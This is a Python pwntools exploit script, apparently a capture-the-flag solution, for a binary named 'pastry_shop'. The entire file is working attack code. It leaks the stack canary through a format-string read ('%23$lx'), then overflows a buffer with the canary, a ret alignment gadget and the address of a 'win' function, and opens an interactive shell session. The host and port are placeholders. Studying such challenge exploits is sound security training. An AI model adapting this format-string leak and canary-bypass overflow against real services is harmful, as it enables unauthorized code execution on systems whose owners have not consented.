#!/usr/bin/env python3
from pwn import *

exe = ELF("./pastry_shop")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

CANARY_IDX = 23

OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88

GADGET = 0x000000000040101a   # ret — stack alignment


def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)


def main():
    r = conn()

    # ── leak phase ────────────────────────────────────────────────────────────
    r.recvuntil(b'dear customer?\n')
    r.sendline(f"%{CANARY_IDX}$lx".encode())
    leak   = r.recvline().strip()
    canary = int(leak, 16)
    log.info(f"canary = {canary:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b'to order?\n')
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()


if __name__ == '__main__':
    main()